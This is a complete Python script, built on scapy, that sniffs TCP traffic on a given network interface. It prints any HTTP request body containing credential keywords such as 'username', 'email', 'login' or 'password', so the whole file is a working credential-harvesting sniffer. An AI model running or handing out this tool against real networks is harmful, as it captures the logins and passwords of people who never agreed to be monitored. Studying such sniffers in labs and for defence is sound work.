#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet, filter="tcp")  # prn= callback
    # available filters
    # bps syntax https://biot.com/capstats/bpf.html
    # port 21
    # udp
    # tpc


def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            payload = packet[scapy.Raw].load
            keywords = ['username', 'uname', 'uid', 'user', 'email', 'mail', 'userid', 'id', 'login', 'password', 'pass']
            for word in keywords:
                if word in payload:
                    print(payload)
                    break


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--iface', dest='iface', help='Interface to sniff on')
    option = parser.parse_args()
    if not option.iface:
        parser.error('[+] Please specify an interface to sniff on')
    else:
        return option.iface


interface = get_arguments()
sniff(interface)
